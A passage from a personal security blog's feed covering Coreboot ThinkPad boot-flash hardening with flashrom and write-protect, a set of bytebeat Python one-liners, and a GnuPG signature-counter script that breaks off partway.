&lt;p&gt;&lt;img alt="test-clip-on-flash-chip" src="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/photos/151-dsc_4287.jpg"&gt;&lt;/p&gt;
&lt;p&gt;The &lt;span class="caps"&gt;VCC&lt;/span&gt; pin doesn&amp;#8217;t need to be connected to the &lt;span class="caps"&gt;SPI&lt;/span&gt; programmer when flashing
(for a Thinkpad X60) because the 3.3 volts required to power the bootflash
chip is sourced from the power supply on the mainboard.  When a battery or a
power supply is connected to the power adapter &amp;#8212; which should be connected to
the mainboard, the bootflash chip is powered and on.  Therefore, only 5 pins
need to be connected to the &lt;span class="caps"&gt;SPI&lt;/span&gt; programming&amp;nbsp;module.&lt;/p&gt;
&lt;p&gt;&lt;img alt="attached-power-while-flashing" src="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/photos/152-dsc_4291.jpg"&gt;&lt;/p&gt;
&lt;p&gt;To flash the chip, use &lt;code&gt;flashrom&lt;/code&gt;, which is packaged in most Debian-based&amp;nbsp;distros.&lt;/p&gt;
&lt;p&gt;&lt;img alt="flashrom-program" src="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/photos/154-dsc_4293.jpg"&gt;&lt;/p&gt;
&lt;p&gt;Flash the chip by specifying the correct chip from the ones listed during
automatic detection by &lt;code&gt;flashrom&lt;/code&gt;, followed by the location of the binary
CoreBoot &lt;span class="caps"&gt;ROM&lt;/span&gt;:&lt;/p&gt;
&lt;pre style="font-size: 90%" class="prettyprint lang-bash"&gt;
  flashrom -c MX25L1605D/MX25L1608D -r factory.bin
&lt;/pre&gt;

&lt;p&gt;If you get output which reads 
&lt;pre style="font-size: 90%" class="prettyprint lang-bash"&gt;
  No EEPROM/flash device found
&lt;/pre&gt;
then check the connection between the test clamp and the bootflash pins, and
make sure you&amp;#8217;ve specified the chip number as is written on the top of the&amp;nbsp;chip.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Flashing: &lt;code&gt;flashrom -r&lt;/code&gt; means read the current contents, ie. save a backup
of the factory &lt;span class="caps"&gt;BIOS&lt;/span&gt;, for future reference. Note that ThinkPad BIOSes are
tied to the particular mainboard so save yours, because no other ThinkPad
&lt;span class="caps"&gt;BIOS&lt;/span&gt; works on your mainboard.  if you lose it and coreboot doesn&amp;#8217;t work then
you have to get another&amp;nbsp;mainboard.&lt;/p&gt;
&lt;p&gt;The flashrom -w command is the one that actually writes to the chip. &amp;#8212;&amp;nbsp;Peter&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;How can I set write-protect on the bootflash chip from&amp;nbsp;hardware?&lt;/h3&gt;
&lt;p&gt;Solder a bridge between pins 3 and 4 on the bootflash chip (&lt;code&gt;MX25L1605D&lt;/code&gt;). My
notes&amp;nbsp;say:&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;pin 3 is&amp;nbsp;read-protect&lt;/li&gt;
&lt;li&gt;pin 4 is&amp;nbsp;ground&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;I think perhaps I meant &lt;em&gt;write-protect&lt;/em&gt;, because read protect doesn&amp;#8217;t make
much sense to me. But that is what I wrote, in case my current second guessing
turns out to be&amp;nbsp;wrong.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;pin 3 on the flash chip is indeed write-protect rather than&amp;nbsp;read-protect.&lt;/p&gt;
&lt;p&gt;Write-protecting the chip is a little complicated: The status register (&lt;span class="caps"&gt;SR&lt;/span&gt;)
in the flash chip has a few block protect bits which say whether parts of
the flash chip, or all of it, is write protected or not. The block protect
bits can be changed by software as long as &lt;span class="caps"&gt;SR&lt;/span&gt; itself can be written. &lt;span class="caps"&gt;SR&lt;/span&gt; is
easily written by software by sending the right command over &lt;span class="caps"&gt;SPI&lt;/span&gt;. flashrom
already does&amp;nbsp;this.&lt;/p&gt;
&lt;p&gt;The top bit 0x80 in &lt;span class="caps"&gt;SR&lt;/span&gt; controls writes to &lt;span class="caps"&gt;SR&lt;/span&gt;, but software writing to &lt;span class="caps"&gt;SR&lt;/span&gt; is
only completely disabled if &lt;em&gt;both&lt;/em&gt; the 0x80 bit is set &lt;em&gt;and&lt;/em&gt; pin 3 is
connected to&amp;nbsp;ground.&lt;/p&gt;
&lt;p&gt;On Macronix and Winbond that &lt;span class="caps"&gt;SR&lt;/span&gt; 0x80 bit is non-volatile, ie. once it has been
set it stays set until it is cleared by software. If pin 3 has been connected
to pin 4 ground then software can&amp;#8217;t clear the bit. On &lt;span class="caps"&gt;SST&lt;/span&gt; the &lt;span class="caps"&gt;SR&lt;/span&gt; 0x80 bit is
volatile and is always 0 on reset. A workaround would be to have coreboot or
possibly a program in the initramfs, but preferably coreboot, set it on boot,
but this requires a bit of&amp;nbsp;development.&lt;/p&gt;
&lt;p&gt;&amp;#8212;&amp;nbsp;Peter&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;How can I set the write-protect bit from&amp;nbsp;firmware?&lt;/h3&gt;
&lt;p&gt;The top bit in the status register (&lt;span class="caps"&gt;SR&lt;/span&gt;) is the write-protect bit, if you&amp;#8217;re
willing to modify the &lt;code&gt;flashrom&lt;/code&gt; program to try to set the write-protect bit
from firmware.  In Peter&amp;#8217;s&amp;nbsp;output:&lt;/p&gt;
&lt;p&gt;&lt;img alt="" src="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/photos/157-dsc_4297.jpg"&gt;&lt;/p&gt;
&lt;p&gt;The output lines
&lt;pre style="font-size: 90%" class="prettyprint lang-bash"&gt;
  b1.SR=0x80
  b3.SR=0x82
&lt;/pre&gt;
are readings of the &lt;span class="caps"&gt;SR&lt;/span&gt; at different access times.  These magic numbers mean
very little to me; if it makes sense to you and you&amp;#8217;ve got more info, let me
know and I&amp;#8217;ll add it&amp;nbsp;here.&lt;/p&gt;
&lt;p&gt;&lt;/p&gt;&lt;span id="finallywrapper" style="align:left; float:left; width:100%;"&gt;&lt;table
id="finally" style="float:left; clear:left; width:65%; padding:0.2em;"&gt;&lt;tbody&gt;
&lt;tr&gt;
  &lt;td style="text-align:center; padding:0.2em;"&gt;
    &lt;img alt="Reassembly" width="400px"
         src="./static/images/2013/12/160-175.reassemble_small.gif" /&gt;
  &lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
&lt;p&gt;&lt;h2&gt;&lt;span class="caps"&gt;FINALLY&lt;/span&gt;&amp;#8230;&lt;/h2&gt;&lt;/p&gt;
&lt;p&gt;&lt;h3&gt;Put it all back together and test&amp;nbsp;it!&lt;/h3&gt;&lt;/p&gt;
&lt;p&gt;Be careful for the little wifi toggle switch on the front of the case where
the lid closes down. It breaks easily. Or gets&amp;nbsp;lost.&lt;/p&gt;
&lt;/p&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt;Additional Notes and Future&amp;nbsp;Research&lt;/h2&gt;
&lt;hr&gt;
&lt;h3&gt;Building a kernel with an initramfs which checks the signature on a Tails live &lt;span class="caps"&gt;USB&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;If someone were to build a kernel for a CoreBoot compatible laptop which loads
an initramfs, which in turn checks a signature on a
&lt;a href="https://tails.boum.org"&gt;Tails&lt;/a&gt; live &lt;span class="caps"&gt;USB&lt;/span&gt; and then calls kexec on the kernel
within the Tails stick.  Because the Tails .iso is signed, but not the
individual components once they are installed to a &lt;span class="caps"&gt;USB&lt;/span&gt; stick, ideally, this
small initramfs should support signing with keys which aren&amp;#8217;t necessarily the
Tails Signing Key (though that could be used as well, if the Tails developers
would like to provide a way to obtain these additional&amp;nbsp;signatures).&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;For coreboot machines, it would work to put the signed .iso on the &lt;span class="caps"&gt;USB&lt;/span&gt; stick
and have the initramfs mount it and start kernel+initrd from within after
having checked the signature of the .iso. The tails-0.20 kernel+initrd would
also fit into a 16Mb boot flash. they&amp;#8217;re about 12Mb together. I don&amp;#8217;t know
if the Tails kernel+initrd has any self-check of the root filesystem
however. &amp;#8212;&amp;nbsp;Peter&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3&gt;Disabling the onboard ethernet&amp;nbsp;controller&lt;/h3&gt;
&lt;p&gt;&lt;img src="./static/images/2013/12/30c3-hhacagb/schematic/06-gbe_disable.jpg"
alt="R422" width="40%"&gt;&lt;/p&gt;
&lt;p&gt;Peter mentioned in his talk that he&amp;#8217;s been looking for a resistor on the
mainboard, labelled &lt;code&gt;R422&lt;/code&gt;, which can be seen in the upper left of
&lt;a href="https://blog.patternsinthevoid.net/images/2013/12/30c3-hhacagb/schematic/06-gbe_disable.jpg"&gt;the schematic&lt;/a&gt;
to the&amp;nbsp;left.&lt;/p&gt;
&lt;p&gt;It&amp;#8217;s possible (but currently untested) that the &lt;code&gt;R422&lt;/code&gt; resistor could be used
to disable the onboard ethernet controller, if &lt;code&gt;R422&lt;/code&gt; were removed, and then
the &lt;code&gt;-GBE_DISABLE&lt;/code&gt; side connected to ground. (Similar to R461&amp;nbsp;above.)&lt;/p&gt;</content><category term="hacking"></category><category term="coreboot"></category><category term="hardware"></category><category term="security"></category></entry><entry><title>Algorithmic Compositions</title><link href="https://blog.patternsinthevoid.net/algorithmic-compositions.html" rel="alternate"></link><published>2013-12-29T17:42:00+00:00</published><updated>2014-09-16T08:41:38+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2013-12-29:/algorithmic-compositions.html</id><content type="html">&lt;p&gt;&lt;strong&gt;&lt;span class="caps"&gt;UPDATED&lt;/span&gt;&lt;/strong&gt;: 23 June, 2014 (&lt;em&gt;originally published on 5 April, 2013&lt;/em&gt;)&lt;/p&gt;
&lt;p&gt;For a long time, I couldn&amp;#8217;t figure out what Twitter was for. I&amp;#8217;m not sure I&amp;#8217;ve
figured that out yet. It seems convenient for posting links to the physics and
cryptography whitepapers I read, and then receiving the internet standard &amp;#8212;
inane feedback from people I&amp;#8217;ve never even heard&amp;nbsp;of.&lt;/p&gt;
&lt;p&gt;At one point, because I couldn&amp;#8217;t figure out what to do with Twitter, I decided
to release a bytebeat album through tweets. I&amp;#8217;ve seen people tweet links to
their new songs or albums or whatever &amp;#8212; that&amp;#8217;s&amp;nbsp;lame. &lt;/p&gt;
&lt;p&gt;So I started creating algorithmic compositions in less than 140 characters in
python. The album, &lt;em&gt;fuck_your_bits&lt;/em&gt; (hashtag=&amp;#8217;#fyb&amp;#8217;), is about half done,
but my friends &lt;a href="http://thoughtcrime.org"&gt;Moxie&lt;/a&gt; and
&lt;a href="https://twitter.com/emblem__"&gt;Emblem&lt;/a&gt; pointed out that not only would the
search function for hashtags on twitter index only the songs in my album from
the past three weeks, but also that tweets in my timeline were dropped from
public view after a certain number of months, depending on some indeterminable
number of other algorithms that calculated &amp;#8220;tweet&amp;nbsp;popularity&amp;#8221;.&lt;/p&gt;
&lt;p&gt;Because people have been asking for the full album, here it is. I&amp;#8217;ll still keep
tweeting it though, because the only other useful thing I can think of that
impressively fits in less than 140 bytes is&amp;nbsp;shellcode.&lt;/p&gt;
&lt;pre style="font-size: 60%" class="prettyprint lang-py"&gt;
python -c'import sys;[sys.stdout.write(chr((~t&amp;t&gt;&gt;3^(((t&gt;&gt;((t&gt;&gt;11)%7+6))%15)*t))%256))for t in xrange(2**19)]'|aplay

python -c'import sys;[sys.stdout.write(chr(((~t&gt;&gt;2)*(2+(42&amp;t*((7&amp;t&gt;&gt;10)*2))&lt;(24&amp;t*((3&amp;t&gt;&gt;14)+2))))%256))for t in xrange(2**18)]'|aplay

python -c'import sys;[sys.stdout.write(chr((((t*5&amp;t&gt;&gt;7|t*9&amp;t&gt;&gt;4|t*18&amp;t/1024)|((t|7)&gt;&gt;5|(t|4)&gt;&gt;9)))%256))for t in xrange(2**18)]'|aplay

python -c'import sys;[sys.stdout.write(chr(((~t&gt;&gt;2)*((127&amp;t*(7&amp;t&gt;&gt;9))&lt;(245&amp;t*(4-(7&amp;t&gt;&gt;13)))))%256))for t in xrange(2**20)]'|aplay -c 2 -r4444

python -c'import sys;[sys.stdout.write(chr((~t&gt;&gt;5&gt;&gt;(127&amp;t*9&amp;~t&gt;&gt;7&lt;42&amp;t*23^5&amp;~t&gt;&gt;13)+3)%256))for t in xrange(2**18)]'|aplay -c2 -r2222

python -c'import sys;[sys.stdout.write(chr((((t&gt;&gt;(2|4)&amp;((t%0x7369)|4|11|5))+(7|4|42)&amp;t))%256))for t in xrange(2**18)]'|aplay -c2 -r4444

python -c'import sys;[sys.stdout.write(chr((((t*(t&gt;&gt;13|t&gt;&gt;8)|(t&gt;&gt;16)-t)-64))%256))for t in xrange(2**18)]'|aplay -r4444

python -c"import sys;[sys.stdout.write(chr(((0x7BB3+t&gt;&gt;11|(t&gt;&gt;(2|5)^(1515|42))|~t)|(2*t)&gt;&gt;6)%256))for t in xrange(2**20)]"|aplay -c2

x="if(t%2)else";python3 -c"[print(t&gt;&gt;15&amp;(t&gt;&gt;(2$x 4))%(3+(t&gt;&gt;(8$x 11))%4)+(t&gt;&gt;10)|42&amp;t&gt;&gt;7&amp;t&lt;&lt;9,end='')for t in range(2**20)]"|aplay -c2 -r4
&lt;/pre&gt;</content><category term="hacking"></category><category term="python"></category><category term="bytebeats"></category><category term="twitter"></category></entry><entry><title>Poor’s Mans Signature Count</title><link href="https://blog.patternsinthevoid.net/poors-mans-signature-count.html" rel="alternate"></link><published>2013-09-07T12:29:00+00:00</published><updated>2014-01-06T14:30:21+00:00</updated><author><name>isis agora lovecruft</name></author><id>tag:blog.patternsinthevoid.net,2013-09-07:/poors-mans-signature-count.html</id><summary type="html">&lt;p&gt;I recently agreed to be the maintainer for Tor&amp;#8217;s
&lt;a href="https://bridges.torproject.org"&gt;BridgeDB&lt;/a&gt; &amp;#8212; both
&lt;a href="https://gitweb.torproject.org/bridgedb.git"&gt;the codebase&lt;/a&gt; and the server
running the website. The poor thing needs a
&lt;a href="https://trac.torproject.org/projects/tor/query?status=accepted&amp;amp;status=assigned&amp;amp;status=needs_information&amp;amp;status=needs_review&amp;amp;status=needs_revision&amp;amp;status=new&amp;amp;status=reopened&amp;amp;component=BridgeDB&amp;amp;groupdesc=1&amp;amp;group=priority&amp;amp;col=id&amp;amp;col=summary&amp;amp;col=status&amp;amp;col=type&amp;amp;col=priority&amp;amp;col=changetime&amp;amp;report=34&amp;amp;order=priority"&gt;lot of ♥♥♥&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;One of the things we want to do is start signing emails from the BridgeDB
email responder. As &lt;a href="tomlowenthal.com"&gt;StrangeCharm&lt;/a&gt; and others have been
complaining that I know to much about GnuPG &amp;#8212; I blame writing
&lt;a href="https://pypi.python.org/pypi/gnupg"&gt;this python module&lt;/a&gt; &amp;#8212; and that I keep
that knowledge all in my head, I figured at least that I should explain a
silly trick I devised this&amp;nbsp;morning.&lt;/p&gt;
&lt;p&gt;So, you have a server somewhere in
&lt;a href="http://www.kickstarter.com/projects/966222131/ardent-mobile-cloud-platform-0?ref=card"&gt;&amp;#8220;The Cloud&amp;#8221;&lt;/a&gt;. You
don&amp;#8217;t have physical access to the hardware, so you can&amp;#8217;t install a
smartcard. You want this server to sign things, and you want to be able to
carry trust over to a new signing key in the event that the server is
compromised. Additionally, you&amp;#8217;d like to be able to discover, as best and as
soon as possible, if that server and its signing key have been&amp;nbsp;compromised.&lt;/p&gt;
&lt;p&gt;So, you create an offline, certification-only keypair. To do this, I booted
into &lt;a href="https://tails.boum.org"&gt;&lt;span class="caps"&gt;TAILS&lt;/span&gt;&lt;/a&gt; on a modified Thinkpad running
&lt;a href="http://www.coreboot.org/Welcome_to_coreboot"&gt;Coreboot&lt;/a&gt;. The modifications
removed the microphone and wifi card, and removed/replaced hardware pertaining
to &lt;span class="caps"&gt;VGA&lt;/span&gt;, &lt;span class="caps"&gt;PCI&lt;/span&gt;, Firewire, &lt;span class="caps"&gt;SD&lt;/span&gt; card reader, and boot flash &lt;span class="caps"&gt;EEPROM&lt;/span&gt; &lt;span class="caps"&gt;SPI&lt;/span&gt;, &lt;em&gt;much&lt;/em&gt;
thanks to my friends at Coreboot, &lt;del&gt;who will hopefully be publishing their
research soon. Sorry to keep secrets, but I would like to respect their
request to allow them time to publish.&lt;/del&gt; &lt;strong&gt;&lt;span class="caps"&gt;UPDATE&lt;/span&gt; [2013-12-30]&lt;/strong&gt;: Peter
Stuge presented this research at 30c3 in his talk,
&lt;a href="http://media.ccc.de/browse/congress/2013/30C3_-_5529_-_en_-_saal_2_-_201312271830_-_hardening_hardware_and_choosing_a_goodbios_-_peter_stuge.html"&gt;&amp;#8220;Hardening Hardware &lt;span class="amp"&gt;&amp;amp;&lt;/span&gt; Choosing a #goodBIOS&amp;#8221;&lt;/a&gt;.
Coreboot, by the way, whether you&amp;#8217;re running on modified hardware or not, is
fucking awesome. Then I attached an &lt;span class="caps"&gt;RJ45&lt;/span&gt; cable and&amp;nbsp;did:&lt;/p&gt;
&lt;pre class="prettyprint lang-bash"&gt;
amnesia@amnesia: ~$ sudo apt-get update &amp;&amp; sudo apt-get install pcscd gpgsm dpkg-repack
[…]
amnesia@amnesia: ~$ cd /lib/live/mount/persistent/…/Persistent
amnesia@amnesia: ~$ for p in gpgsm pcscd ; do sudo dpkg-repack $p ; done
&lt;/pre&gt;

&lt;p&gt;in order to download, install, and then repackage the .debs for the GnuPG
X.509 certificate manager and smartcard reader driver allocation control
daemon. Though it turns out this did me no good. I wanted to use all Open
Source Hardware for my smartcards, and so (due to
&lt;a href="https://twitter.com/ioerror"&gt;@ioerror&lt;/a&gt;&amp;#8216;s research from a year or so ago and
recommendation) I went with using a
&lt;a href="http://www.gemalto.com/products/usb_shell_token_v2/"&gt;Gemalto &lt;span class="caps"&gt;USB&lt;/span&gt; smartcard reader&lt;/a&gt;
with an &lt;a href="http://www.g10code.de/p-card.html"&gt;OpenPGP &lt;span class="caps"&gt;ID&lt;/span&gt;-000 smartcard&lt;/a&gt; (for
purchase
&lt;a href="http://shop.kernelconcepts.de/product_info.php?cPath=1_26&amp;amp;products_id=42&amp;amp;osCsid=4af06348fac08e7c8f49253279fa97c7"&gt;here&lt;/a&gt;
and
&lt;a href="http://shop.kernelconcepts.de/product_info.php?cPath=1_26&amp;amp;products_id=119&amp;amp;osCsid=4af06348fac08e7c8f49253279fa97c7"&gt;here&lt;/a&gt;). However,
the documentation for the OpenPGP smartcard would lead one to believe that it
supports three keyslots of 3072-bit length. As it turns out, &lt;em&gt;this is
extremely misleading&lt;/em&gt;, to the extent that &amp;#8212; not only would I have to generate
keys below my comfort level bitlength &amp;#8212; the card is unusable for any serious
key sanitation schema: &lt;em&gt;you can&amp;#8217;t store 3072-bit certification-only keys on
these cards&lt;/em&gt;, not as far as I can tell. Normally, you want your primary key to
be certification-only and kept offline, and then keep separated signing,
encryption, and authentication subkeys online and rotate them every so often,
using …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I recently agreed to be the maintainer for Tor&amp;#8217;s
&lt;a href="https://bridges.torproject.org"&gt;BridgeDB&lt;/a&gt; &amp;#8212; both
&lt;a href="https://gitweb.torproject.org/bridgedb.git"&gt;the codebase&lt;/a&gt; and the server
running the website. The poor thing needs a
&lt;a href="https://trac.torproject.org/projects/tor/query?status=accepted&amp;amp;status=assigned&amp;amp;status=needs_information&amp;amp;status=needs_review&amp;amp;status=needs_revision&amp;amp;status=new&amp;amp;status=reopened&amp;amp;component=BridgeDB&amp;amp;groupdesc=1&amp;amp;group=priority&amp;amp;col=id&amp;amp;col=summary&amp;amp;col=status&amp;amp;col=type&amp;amp;col=priority&amp;amp;col=changetime&amp;amp;report=34&amp;amp;order=priority"&gt;lot of ♥♥♥&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;One of the things we want to do is start signing emails from the BridgeDB
email responder. As &lt;a href="tomlowenthal.com"&gt;StrangeCharm&lt;/a&gt; and others have been
complaining that I know to much about GnuPG &amp;#8212; I blame writing
&lt;a href="https://pypi.python.org/pypi/gnupg"&gt;this python module&lt;/a&gt; &amp;#8212; and that I keep
that knowledge all in my head, I figured at least that I should explain a
silly trick I devised this&amp;nbsp;morning.&lt;/p&gt;
&lt;p&gt;So, you have a server somewhere in
&lt;a href="http://www.kickstarter.com/projects/966222131/ardent-mobile-cloud-platform-0?ref=card"&gt;&amp;#8220;The Cloud&amp;#8221;&lt;/a&gt;. You
don&amp;#8217;t have physical access to the hardware, so you can&amp;#8217;t install a
smartcard. You want this server to sign things, and you want to be able to
carry trust over to a new signing key in the event that the server is
compromised. Additionally, you&amp;#8217;d like to be able to discover, as best and as
soon as possible, if that server and its signing key have been&amp;nbsp;compromised.&lt;/p&gt;
&lt;p&gt;So, you create an offline, certification-only keypair. To do this, I booted
into &lt;a href="https://tails.boum.org"&gt;&lt;span class="caps"&gt;TAILS&lt;/span&gt;&lt;/a&gt; on a modified Thinkpad running
&lt;a href="http://www.coreboot.org/Welcome_to_coreboot"&gt;Coreboot&lt;/a&gt;. The modifications
removed the microphone and wifi card, and removed/replaced hardware pertaining
to &lt;span class="caps"&gt;VGA&lt;/span&gt;, &lt;span class="caps"&gt;PCI&lt;/span&gt;, Firewire, &lt;span class="caps"&gt;SD&lt;/span&gt; card reader, and boot flash &lt;span class="caps"&gt;EEPROM&lt;/span&gt; &lt;span class="caps"&gt;SPI&lt;/span&gt;, &lt;em&gt;much&lt;/em&gt;
thanks to my friends at Coreboot, &lt;del&gt;who will hopefully be publishing their
research soon. Sorry to keep secrets, but I would like to respect their
request to allow them time to publish.&lt;/del&gt; &lt;strong&gt;&lt;span class="caps"&gt;UPDATE&lt;/span&gt; [2013-12-30]&lt;/strong&gt;: Peter
Stuge presented this research at 30c3 in his talk,
&lt;a href="http://media.ccc.de/browse/congress/2013/30C3_-_5529_-_en_-_saal_2_-_201312271830_-_hardening_hardware_and_choosing_a_goodbios_-_peter_stuge.html"&gt;&amp;#8220;Hardening Hardware &lt;span class="amp"&gt;&amp;amp;&lt;/span&gt; Choosing a #goodBIOS&amp;#8221;&lt;/a&gt;.
Coreboot, by the way, whether you&amp;#8217;re running on modified hardware or not, is
fucking awesome. Then I attached an &lt;span class="caps"&gt;RJ45&lt;/span&gt; cable and&amp;nbsp;did:&lt;/p&gt;
&lt;pre class="prettyprint lang-bash"&gt;
amnesia@amnesia: ~$ sudo apt-get update &amp;&amp; sudo apt-get install pcscd gpgsm dpkg-repack
[…]
amnesia@amnesia: ~$ cd /lib/live/mount/persistent/…/Persistent
amnesia@amnesia: ~$ for p in gpgsm pcscd ; do sudo dpkg-repack $p ; done
&lt;/pre&gt;

&lt;p&gt;in order to download, install, and then repackage the .debs for the GnuPG
X.509 certificate manager and smartcard reader driver allocation control
daemon. Though it turns out this did me no good. I wanted to use all Open
Source Hardware for my smartcards, and so (due to
&lt;a href="https://twitter.com/ioerror"&gt;@ioerror&lt;/a&gt;&amp;#8216;s research from a year or so ago and
recommendation) I went with using a
&lt;a href="http://www.gemalto.com/products/usb_shell_token_v2/"&gt;Gemalto &lt;span class="caps"&gt;USB&lt;/span&gt; smartcard reader&lt;/a&gt;
with an &lt;a href="http://www.g10code.de/p-card.html"&gt;OpenPGP &lt;span class="caps"&gt;ID&lt;/span&gt;-000 smartcard&lt;/a&gt; (for
purchase
&lt;a href="http://shop.kernelconcepts.de/product_info.php?cPath=1_26&amp;amp;products_id=42&amp;amp;osCsid=4af06348fac08e7c8f49253279fa97c7"&gt;here&lt;/a&gt;
and
&lt;a href="http://shop.kernelconcepts.de/product_info.php?cPath=1_26&amp;amp;products_id=119&amp;amp;osCsid=4af06348fac08e7c8f49253279fa97c7"&gt;here&lt;/a&gt;). However,
the documentation for the OpenPGP smartcard would lead one to believe that it
supports three keyslots of 3072-bit length. As it turns out, &lt;em&gt;this is
extremely misleading&lt;/em&gt;, to the extent that &amp;#8212; not only would I have to generate
keys below my comfort level bitlength &amp;#8212; the card is unusable for any serious
key sanitation schema: &lt;em&gt;you can&amp;#8217;t store 3072-bit certification-only keys on
these cards&lt;/em&gt;, not as far as I can tell. Normally, you want your primary key to
be certification-only and kept offline, and then keep separated signing,
encryption, and authentication subkeys online and rotate them every so often,
using the primary certification-only key to sign the newly rotated keys to
rollover trust assignments. Sure, great. This card has slots for 3072-bit
signing, encryption, and authentication keys. Once the slots are filled, I
can&amp;#8217;t replace the keys. I suppose the OpenPGP card is targeted at people who
want to have to spend €20 everytime they rotate keys, but for me, I think
cryptography should be a tool for the masses &amp;#8212; not just for overpaid,
overfed, white-hatty white dudes who expense the&amp;nbsp;charge.&lt;/p&gt;
&lt;p&gt;Onwards. I removed the ethernet cable and rebooted &lt;span class="caps"&gt;TAILS&lt;/span&gt;, (&lt;a href="http://media.ccc.de/browse/congress/2013/30C3_-_5380_-_en_-_saal_2_-_201312291830_-_persistent_stealthy_remote-controlled_dedicated_hardware_malware_-_patrick_stewin.html"&gt;make sure you never boot a Thinkpad with an ethernet cable attached to it&lt;/a&gt;),
thus the machine &lt;em&gt;should&lt;/em&gt;, provided the hardware modification work, not be
able to communicate with any other devices. Then with
&lt;a href="https://blog.patternsinthevoid.net/gpg.conf.txt"&gt;this gpg.conf&lt;/a&gt; (commenting
out and replacing things which have to do with my normal key) I generated the
certification only key, choosing &lt;code&gt;RSA-only (set your own capabilities)&lt;/code&gt;.&amp;nbsp;Then&lt;/p&gt;
&lt;pre class="prettyprint lang-bash"&gt;
$ gpg --edit-key […]
$ gpg&gt; addkey
[…]
&lt;/pre&gt;

&lt;p&gt;and going through the whole process again for each of the signing&amp;nbsp;subkeys.&lt;/p&gt;
&lt;p&gt;Next, you create a way for this remote server (A) to authenticate to a git
server (B). Gitolite works great for giving keyed access to a repo without
needing to give that entity an account on B. You should generate either an ssh
key or an authentication-capable GnuPG subkey, and don&amp;#8217;t keep it stored on
disk anywhere on A, but load it into the agent there with indefinite lifetime
(or whatever timeframe you want to have to login onto the server and refresh&amp;nbsp;it).&lt;/p&gt;
&lt;p&gt;So let&amp;#8217;s say A now has access to a git repository on&amp;nbsp;B.&lt;/p&gt;
&lt;p&gt;The Poor Man&amp;#8217;s signature count, without a smartcard (which in my case doesn&amp;#8217;t
actually do me much good, but it could be useful for normal people signing
emails and things, or developers who sign all their git commits), goes like
this: instead of signing things with &lt;code&gt;"$ gpg -s --clearsign email.txt"&lt;/code&gt;, you
do this&amp;nbsp;mess:&lt;/p&gt;
&lt;pre style="font-size: 90%" class="prettyprint lang-bash"&gt;
  ∃!isisⒶwintermute:(master *$)~ ∴ gpg -a --clearsign \
      -N "sig.count@bridges.torproject.org=$(( `cat ~/.gnupg/sigs-0xA3ADB67A2CDB8B35/sig-count` + 1 ))" \
      email.txt &amp;&amp; \
      { ns=$(( `cat ~/.gnupg/sigs-0xA3ADB67A2CDB8B35/sig-count` + 1 )) ;
        echo -n "$ns" |&amp; tee &gt; ~/.gnupg/sigs-0xA3ADB67A2CDB8B35/sig-count ;} &amp;&amp; \
      { d=`date +"%s"`; cd ~/.gnupg/sigs-0xA3ADB67A2CDB8B35 &amp;&amp; \
           { git add ~/.gnupg/sigs-0xA3ADB67A2CDB8B35/sig-count &amp;&amp; \
                 git commit -q -S -m "$d $ns" &lt;/dev/null ;} &amp;&amp; \
           git push origin master ;};&lt;/pre&gt;

&lt;/pre&gt;

&lt;p&gt;The &amp;#8216;-N&amp;#8217; will set a new signature notation for the signature being created on
the &amp;#8216;email.txt&amp;#8217; file. This added signature notation which will include the
signature counter stored in the file
&amp;#8216;~/.gnupg/sigs-0xA3ADB67A2CDB8B35/sig-count&amp;#8217;, incremented by one. If the
creation of this signature is successful, the increased counter is then
written to that same file. Then, the sig-count file is add to a commit which
has an &lt;span class="caps"&gt;UE&lt;/span&gt; timestamp and the current signature count in the commit message, and
this commit is signed with another gpg signature, and pushed to a remote git&amp;nbsp;server.&lt;/p&gt;
&lt;p&gt;You can also set the keyserver &lt;span class="caps"&gt;URL&lt;/span&gt; as a data packet in the &lt;span class="caps"&gt;GPG&lt;/span&gt; key, if you put
something&amp;nbsp;like&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="err"&gt;sig-keyserver-url https://code.patternsinthevoid.net/?p=sigs-0xA3ADB67A2CDB8B35.git;a=blob_plain;f=sigs;hb=HEAD&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;into your gpg.conf as you are generating the key, or afterwards, if you resign&amp;nbsp;it.&lt;/p&gt;
&lt;p&gt;Also, so that you don&amp;#8217;t have to type that above crazy bash nonsense, there is
&lt;a href="https://code.patternsinthevoid.net/?p=scripts.git;a=blob;f=gpg-sig-counter"&gt;a script which will do all of this for you&lt;/a&gt;.&lt;/p&gt;
&lt;pre class="prettyprint lang-bash"&gt;
 #!/bin/bash
 #-----------------------------------------------------------------------------
 # gpg-sig-counter
 # ----------------
 # This is a script which can be used to keep track of the number of signatures
 # for a GPG signing key. It is not meant for certifications
 # (a.k.a. signatures) on others' keys. To use it, put it somewhere on your
 # $PATH and create a repo somewhere for keeping a record of signatures. At the
 # top of this script, fill out the variables $SIG_REPO, $REMOTE, $BRANCH for
 # the local directory containing the repo for storing signature data, the name
 # of the remote to push to, and the name of the branch, respectively.
 #
 # This script can be called like this, assuming you want to sign the file
 # 'email.txt':
 #
 # ∃!isisⒶwintermute:(master *$)~ ∴ gpg-sig-counter -f email.txt \
 # …    -h patternsinthevoid.net
 #
 # Where the domain after the '-d' flag should be the domain name of your
 # default GPG key which you are signing with. If you want you can put the
 # locations of your signature repo in your signatures too, to do this put:
 #
